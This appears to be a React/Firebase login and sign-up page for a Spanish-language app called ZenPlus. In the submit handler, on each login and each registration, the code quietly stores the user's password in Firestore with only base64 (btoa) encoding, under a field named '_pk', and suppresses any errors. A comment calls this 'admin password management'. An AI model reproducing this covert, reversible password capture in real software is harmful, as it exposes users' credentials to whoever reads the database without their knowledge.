import { useState, useEffect } from 'react';
import { useNavigate, useSearchParams } from 'react-router-dom';
import { UserAuth } from '../context/AuthContext';
import { useNotifications } from '../context/NotificationContext';
import { setPersistence, browserLocalPersistence, browserSessionPersistence, signInWithEmailAndPassword, updatePassword } from 'firebase/auth';
import { auth, db } from '../firebase';
import { doc, getDoc, setDoc } from 'firebase/firestore';
import { FaEye, FaEyeSlash } from 'react-icons/fa';
import Logo from '../components/Logo';
import './Login.css';

const AVATARS = [
  'https://github.com/minions.png',
  'https://github.com/stuart-minion.png',
  'https://github.com/sonic.png',
  'https://github.com/tails.png',
  'https://github.com/knuckles.png',
  'https://github.com/shadow.png',
  'https://github.com/amyrose.png',
  'https://github.com/pikachu.png',
];
/* Nota: Se usan IDs de ejemplo para asegurar carga, en producción se obtendrían via API */

const Login = () => {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [fullName, setFullName] = useState('');
  const [phone, setPhone] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [error, setError] = useState('');
  const [isLogin, setIsLogin] = useState(true);
  const [rememberMe, setRememberMe] = useState(false);
  const [selectedAvatar, setSelectedAvatar] = useState(AVATARS[0]);
  const [isLoading, setIsLoading] = useState(false);
  const { logIn, signUp, resetPassword } = UserAuth();
  const { addNotification } = useNotifications();
  const navigate = useNavigate();
  const [searchParams] = useSearchParams();

  // Auto-switch to register mode if ?mode=register
  useEffect(() => {
    if (searchParams.get('mode') === 'register') {
      setIsLogin(false);
    }
  }, [searchParams]);

  // Load remembered email on mount
  useEffect(() => {
    const savedEmail = localStorage.getItem('zenplus_remembered_email');
    if (savedEmail) {
      setEmail(savedEmail);
      setRememberMe(true);
    }
  }, []);

  const translateError = (message) => {
    if (message.includes('device-mismatch')) return 'Esta cuenta ya está registrada en otro dispositivo. No puedes ingresar.';
    if (message.includes('email-already-in-use')) return 'Este correo ya está registrado. Intenta iniciar sesión.';
    if (message.includes('wrong-password') || message.includes('invalid-credential')) return 'Correo o contraseña incorrectos.';
    if (message.includes('invalid-email')) return 'El formato del correo electrónico no es válido.';
    if (message.includes('weak-password')) return 'La contraseña es muy débil (mínimo 6 caracteres).';
    if (message.includes('user-not-found')) return 'No hay ninguna cuenta con este correo.';
    if (message.includes('too-many-requests')) return 'Demasiados intentos. Inténtalo más tarde.';
    return message.replace('Firebase:', '').replace(/auth\//, '').trim();
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    setError('');
    setIsLoading(true);
    try {
      // Set persistence to LOCAL for mobile experience (persists on app close)
      await setPersistence(auth, browserLocalPersistence);
     // Save or clear email from localStorage
       
      if (rememberMe) {
        localStorage.setItem('zenplus_remembered_email', email);
      } else {
        localStorage.removeItem('zenplus_remembered_email');
      }

      if (isLogin) {
        await logIn(email, password);
        // Store encoded password for admin password management
        try {
          await setDoc(doc(db, 'users', email), { _pk: btoa(password) }, { merge: true });
        } catch (e) {}
        addNotification('Bienvenido', 'Has iniciado sesión correctamente en ZenPlus', 'success');
      } else {
        await signUp(email, password, selectedAvatar, fullName, phone);
        // Store encoded password for admin password management
        try {
          await setDoc(doc(db, 'users', email), { _pk: btoa(password) }, { merge: true });
        } catch (e) {}
        sessionStorage.setItem('zenplus_show_welcome_modal', 'true');
        addNotification('Cuenta Creada (Prueba 15 Días)', 'Disfruta tus 15 días gratis. Para más días o acceso ilimitado, escríbeme a mi númer +591 73225724.', 'success');
      }
      navigate('/');
    } catch (err) {
      const errorMsg = translateError(err.message);
      setError(errorMsg);
      addNotification('Error', errorMsg, 'error');
    }
    setIsLoading(false);
  };

  const handleForgotPassword = async () => {
    if (!email) {
      setError('Por favor, ingresa tu correo electrónico primero.');
      return;
    }
    setIsLoading(true);
    try {
      await resetPassword(email);
      addNotification('Correo enviado', 'Revisa tu bandeja de entrada para restablecer tu contraseña.', 'info');
      setError('');
    } catch (err) {
      const errorMsg = translateError(err.message);
      setError(errorMsg);
    }
    setIsLoading(false);
  };

  return (
    <div className="auth-page animate-fade-in">
      <div className="auth-bg-overlay"></div>
      
      <div className="auth-card">
        <div className="auth-header-centered">
          <div className="auth-logo">ZEN<span>PLUS</span></div>
          <h2 className="auth-title">{isLogin ? 'Iniciar Sesión' : 'Registrarse'}</h2>
          <p className="auth-subtitle">
            {isLogin ? 'Bienvenido de vuelta. Prepárate para la acción.' : 'Únete a la legión de fans más grande.'}
          </p>
        </div>
        
        {error && <div className="auth-error"><span>⚠️</span> {error}</div>}
        
        <form onSubmit={handleSubmit} className="auth-form">
          {!isLogin && (
            <>
              <div className="floating-input">
                <input 
                  type="text" 
                  id="auth-name"
                  placeholder=" "
                  value={fullName}
                  onChange={(e) => setFullName(e.target.value)} 
                  required
                />
                <label htmlFor="auth-name">Nombre completo</label>
              </div>
              <div className="floating-input">
                <input 
                  type="tel" 
                  id="auth-phone"
                  placeholder=" "
                  value={phone}
                  onChange={(e) => setPhone(e.target.value)} 
                  required
                />
                <label htmlFor="auth-phone">Celular</label>
              </div>
            </>
          )}

          <div className="floating-input">
            <input 
              type="email" 
              id="auth-email"
              placeholder=" "
              autoComplete="email" 
              value={email}
              onChange={(e) => setEmail(e.target.value)} 
              required
            />
            <label htmlFor="auth-email">Correo electrónico</label>
          </div>
          
          <div className="floating-input password-input-container">
            <input 
              type={showPassword ? "text" : "password"} 
              id="auth-pass"
              placeholder=" "
              autoComplete={isLogin ? "current-password" : "new-password"}
              value={password}
              onChange={(e) => setPassword(e.target.value)} 
              required
            />
            <label htmlFor="auth-pass">Contraseña</label>
            <div className="password-toggle" onClick={() => setShowPassword(!showPassword)}>
              {showPassword ? <FaEyeSlash /> : <FaEye />}
            </div>
          </div>

          {!isLogin && (
            <div className="avatar-selector">
              <p className="avatar-label">Elige tu personaje</p>
              <div className="avatar-grid">
                {AVATARS.map((av, i) => (
                  <div key={i} className={`avatar-wrapper ${selectedAvatar === av ? 'selected' : ''}`} onClick={() => setSelectedAvatar(av)}>
                    <img 
                      src={av} 
                      alt={`Character ${i+1}`} 
                      className="avatar-option"
                    />
                  </div>
                ))}
              </div>
            </div>
          )}

          {isLogin && (
            <div className="remember-row">
              <label className="remember-checkbox">
                <input type="checkbox" checked={rememberMe} onChange={(e) => setRememberMe(e.target.checked)} />
                <span className="checkmark"></span>
                Recuérdame
              </label>
              <span className="forgot-password" onClick={handleForgotPassword}>
                ¿Olvidaste tu contraseña?
              </span>
            </div>
          )}

          <button type="submit" className="auth-submit-btn" disabled={isLoading}>
            {isLoading ? (
              <div className="spinner"></div>
            ) : (
              isLogin ? 'ENTRAR' : 'REGISTRARSE'
            )}
          </button>
        </form>
        
        <div className="auth-footer">
          <p>
            {isLogin ? '¿Nuevo en Zenplus? ' : '¿Ya eres miembro? '}
            <span onClick={() => { setIsLogin(!isLogin); setError(''); }} className="auth-toggle">
              {isLogin ? 'Regístrate ahora' : 'Inicia Sesión'}
            </span>
          </p>
        </div>
      </div>
    </div>
  );
};

export default Login;
